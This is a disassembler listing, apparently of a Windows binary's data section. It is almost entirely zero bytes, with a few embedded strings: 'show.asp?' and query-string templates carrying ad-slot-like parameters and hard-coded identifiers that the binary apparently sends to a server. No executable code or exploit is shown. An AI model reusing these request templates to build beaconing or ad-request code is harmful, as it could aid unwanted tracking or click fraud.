                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ah ; j
                db  6Ah ; j
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  64h ; d
                db  65h ; e
                db  76h ; v
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  73h ; s
                db  6Ch ; l
                db  6Fh ; o
                db  74h ; t
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  70h ; p
                db  3Dh ; =
                db  46h ; F
                db  26h ; &
                db  75h ; u
                db  3Dh ; =
                db  6Ah ; j
                db  68h ; h
                db  6Bh ; k
                db  71h ; q
                db  61h ; a
                db  6Ch ; l
                db  74h ; t
                db  61h ; a
                db  64h ; d
                db  61h ; a
                db  33h ; 3
                db  63h ; c
                db  70h ; p
                db  68h ; h
                db  78h ; x
                db  6Ch ; l
                db  26h ; &
                db  6Dh ; m
                db  61h ; a
                db  79h ; y
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  67h ; g
                db  3Dh ; =
                db  34h ; 4
                db  33h ; 3
                db  36h ; 6
                db  33h ; 3
                db  26h ; &
                db  6Eh ; n
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  63h ; c
                db  3Dh ; =
                db  30h ; 0
                db  2Eh ; .
                db  37h ; 7
                db  35h ; 5
                db  26h ; &
                db  6Ah ; j
                db  69h ; i
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  69h ; i
                db  3Dh ; =
                db  48h ; H
                db  6Fh ; o
                db  6Dh ; m
                db  65h ; e
                db  26h ; &
                db  63h ; c
                db  77h ; w
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
aShowAsp        db 'show.asp?',0        ; DATA XREF: sub_404110+5B↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  62h ; b
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  63h ; c
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  67h ; g
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  64h ; d
                db  6Ch ; l
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  61h ; a
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  70h ; p
                db  3Dh ; =
                db  32h ; 2
                db  46h ; F
                db  72h ; r
                db  65h ; e
                db  67h ; g
                db  69h ; i
                db  6Fh ; o
                db  6Eh ; n
                db  32h ; 2
                db  46h ; F
                db  26h ; &
                db  75h ; u
                db  3Dh ; =
                db  6Eh ; n
                db  35h ; 5
                db  76h ; v
                db  68h ; h
                db  38h ; 8
                db  72h ; r
                db  6Dh ; m
                db  72h ; r
                db  6Eh ; n
                db  6Ch ; l
                db  6Fh ; o
                db  70h ; p
                db  6Fh ; o
                db  31h ; 1
                db  65h ; e
                db  63h ; c
                db  26h ; &
                db  62h ; b
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  6Eh ; n
                db  3Dh ; =
                db  30h ; 0
                db  26h ; &
                db  63h ; c
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  78h ; x
                db  3Dh ; =
                db  34h ; 4
                db  30h ; 0
                db  30h ; 0
                db  26h ; &
                db  79h ; y
                db  3Dh ; =
                db  34h ; 4
                db  31h ; 1
                db  35h ; 5
                db  33h ; 3
                db  26h ; &
                db  65h ; e
                db  3Dh ; =
                db  25h ; %
                db  73h ; s
                db  26h ; &
                db  77h ; w
                db  74h ; t
                db  3Dh ; =
                db  33h ; 3
                db  30h ; 0
                db  71h ; q
                db  30h ; 0
                db  30h ; 0
                db  64h ; d
                db  6Eh ; n
                db  30h ; 0
                db  30h ; 0
                db  65h ; e
                db  69h ; i
                db  37h ; 7
                db  36h ; 6
                db  68h ; h
                db  63h ; c
                db  39h ; 9
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_428C10      db  3Fh ; ?             ; DATA XREF: sub_404110+6D↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ch ; l
                db  76h ; v
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  73h ; s
                db  73h ; s
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  63h ; c
                db  69h ; i
                db  64h ; d
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  74h ; t
                db  61h ; a
                db  6Ch ; l
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  67h ; g
                db  67h ; g
                db  65h ; e
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  6Ch ; l
                db  62h ; b
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
